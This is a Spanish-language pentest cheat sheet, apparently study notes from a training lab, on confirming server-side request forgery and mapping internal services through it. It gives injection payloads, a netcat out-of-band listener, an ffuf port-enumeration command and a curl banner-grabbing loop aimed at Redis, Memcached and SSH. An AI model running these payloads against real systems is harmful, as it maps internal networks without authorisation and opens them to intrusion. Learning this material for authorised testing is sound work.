---
aliases: null
tags:
  - type/technique
  - vuln/ssrf
  - technique/lateral-movement
  - asset/web-app
kind: SubCheatSheet
linked:
  - '[[Server-Side Request Forgery (SSRF)]]'
  - '[[SSRF - CWES]]'
---
# SSRF - Reconocimiento

***

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nc -lnvp 8000` | Listener OOB local — captura conexión del backend | Confirmación inicial OOB. |
| `dateserver=http://YOUR_IP:8000/ssrf` (en POST) | Backend conecta a tu listener → SSRF confirmado | Test out-of-band canónico. |
| `dateserver=http://127.0.0.1/index.php` (en POST) | Página propia del backend reflejada en response | Discriminar In-Band vs Blind. |
| `dateserver=http://CANARY.oast.fun/probe` | DNS + HTTP hit en Collaborator | Alternativa sin abrir puerto local. |
| `seq 1 10000 > ports.txt` | Wordlist de puertos 1-10000 | Setup pre-fuzz. |
| `ffuf -w ports.txt -u http://TARGET/index.php -X POST -d 'dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01' -fr 'Failed to connect to'` | Lista de puertos internos abiertos | Port enum via SSRF. |
| `ffuf -w ports.txt -u ... -mr 'banner\|SSH\|HTTP'` | Filtra puertos con banner detectable | Service fingerprinting. |
| `dateserver=http://127.0.0.1:22/` | Banner SSH si abierto | Single-port probe. |
| `dateserver=http://127.0.0.1:6379/info` | Output `INFO` de Redis sin auth | Detección Redis interno. |
| `dateserver=http://127.0.0.1:11211/stats` | Stats Memcached | Memcached sin auth. |
| `dateserver=http://192.168.1.1/` | Pivot a host LAN | Discovery cross-host. |
^ssrf-reconocimiento

### Workflow

```bash
# 1. Listener OOB
nc -lnvp 8000 &

# 2. Probe SSRF out-of-band
curl -X POST http://TARGET/index.php \
  -d 'dateserver=http://YOUR_IP:8000/ssrf&date=2024-01-01'
# → conexión en netcat = SSRF confirmado

# 3. Confirmar In-Band vs Blind
curl -X POST http://TARGET/index.php \
  -d 'dateserver=http://127.0.0.1/index.php&date=2024-01-01'
# Si la respuesta contiene HTML del backend → In-Band; sino → [[SSRF - Blind SSRF]]

# 4. Port enum interno con FFUF
seq 1 10000 > ports.txt
ffuf -w ports.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01' \
     -fr 'Failed to connect to'

# 5. Banner grab por puerto descubierto
for p in 22 80 3306 6379 8080 11211; do
  echo "=== $p ==="
  curl -s -X POST http://TARGET/index.php \
    -d "dateserver=http://127.0.0.1:$p/&date=2024-01-01" | head -c 200
done
```

___

## Overview

Reconocimiento SSRF = 3 etapas:
1. **Confirmar** que el backend hace fetch (OOB con netcat/Collaborator).
2. **Discriminar In-Band vs Blind** apuntando a la propia app — si refleja contenido → In-Band.
3. **Port enum** de loopback con FFUF + filtro de error connection-refused.

Resultados comunes en port enum: 80 (web interno), 3306 (MySQL), 6379 (Redis), 8080 (admin), 11211 (Memcached), 8500 (Consul), 9200 (Elasticsearch).

***
